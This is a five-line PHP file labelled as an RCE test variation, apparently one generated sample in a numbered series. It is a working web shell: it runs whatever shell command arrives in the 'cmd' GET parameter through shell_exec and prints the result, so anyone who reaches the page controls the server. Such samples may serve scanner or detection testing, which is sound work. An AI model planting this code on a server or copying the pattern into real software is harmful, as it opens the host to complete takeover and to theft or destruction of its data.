<?php
// RCE test variation #1169
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>